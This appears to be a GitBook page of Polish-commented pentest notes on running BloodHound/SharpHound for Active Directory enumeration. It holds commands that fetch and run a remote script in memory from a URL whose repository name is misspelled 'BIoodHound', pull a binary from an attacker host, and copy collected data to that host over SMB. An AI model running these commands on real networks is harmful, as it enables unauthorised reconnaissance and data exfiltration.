---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# BloodHound

Windows

{% code overflow="wrap" fullWidth="true" %}
```python
#załadowanie Bloodhound do pamięci RAM
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BIoodHound/master/Collectors/SharpHound.ps1")

#lub ściągamy sharphound.exe od siebie z Kaliego
10.20.10.31:8080
#lub
Invoke-WebRequest -uri http://10.20.10.31:8080/SharpHound.exe -OutFile C:\Users\mike\Desktop\SharpHound.exe

#uruchomienie - jesteśmy w folderze gdzie jest SharpHound
.\SharpHound.exe --collectionmethods all

#podłaczenie się do serwera SMB uruchomionego na Kalim
net use x: \\10.20.10.31\share

#kopiowanie jak jesteśmy w tym folderze w którym jest ten plik który chcemy skopiować z Windowsa na Kaliego
Copy-Item .\plik.zip X:
```
{% endcode %}

Kali

```python
#instalacja
sudo apt install bloodhound

#start neo4j
sudo neo4j console

#zmiana hasła
localhost:7474

neo4j:neo4j

#start Bloodhound
bloodhound

#odpalenie kolektora Sharphound
cd /usr/lib/bloodhound/resources/app/Collectors
python -m http.server 8080

#wystawienie katalogu Desktop w Kali na zewnątrz
sudo impacket-smbserver -smb2support share /home/kali/Desktop
```
